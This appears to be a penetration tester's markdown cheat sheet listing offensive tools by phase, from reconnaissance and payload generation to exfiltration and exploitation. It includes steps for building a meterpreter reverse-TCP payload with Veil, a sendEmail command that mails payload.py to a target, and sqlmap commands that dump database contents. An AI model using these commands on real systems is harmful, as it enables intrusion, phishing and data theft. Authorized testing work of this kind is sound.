---
title: CISA Tools - Reconnaissance
---
# List of Tools for CISA
## Network Reconnaissance
### Nessus
Start Nessus
```
service nessusd start
```
Browse to the https://<nessus host>:8834
* Username: root
* Password: toor
Create a new Advanced Scan
* Turn off ping
* Enable generic web application tests
### NMAP
### SimplyEmail
### theHarvester

## Web Application Reconnaissance
### Vega
### Acunetix
### Burp Suite
### Nessus
### Nikto
### Nmap Scripting Engine

## Payload Generation
### Cobalt Strike
### MSFvenom
### Veil Framework
start Veil Framework navigate to the /Veil Framwork directory.
```
./Veil.py
```
If you have the ability to select between "Evasion and Ordnance" use Evasion. 
Run the "list" command to show Available Tools.
Use the 'python/meterpreter/rev_tcp.py' option from the list. Example below
```
use 28
```
The check the Required Options. 
```
options
```
Set the lhost ip address. 
Now you can Generate the payload. 



## Listeners
### Cobalt Strike
### Metasploit
### netcat

## Email Client
### Cobalt Strike
### SendEmail

```
sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
123.123.123.2:25 -u foo -a payload.py -m Click Me
```

## Data Exfiltration
### Egress-Assess

## Enumeration
PowerSploit

## Directory Brute Force
### Aquatone
### EyeWitness

## Directory Bruce-Force
### DirBuster
### Gobuster

## Exploitation
### Burp Suite
### Metasploit
### SearchSploit
### sqlmap
create file from burp with loginin POST from burp suite - This is easier when done under the target usage --batch assume defaults good for background enumeration. 
```
sqlmap -r login.req -p id --level 5 --risk 3 --threads 10 --batch 
```
Basic sqlmap command usage
```
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" --dbs
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" --tables 
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" --columns 
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" -C "columnName" --dump
```
Manual testing for sqlmap can include using the following. 
```
http://site/name.php?henryearl=1
http://site/name.php?henryearl=1'
http://site/name.php?henryearl=-1
http://site/name.php?henryearl=-1'
```
[Thanks to Database Tutorials] (https://www.youtube.com/watch?v=oWHKIiRGjtQ)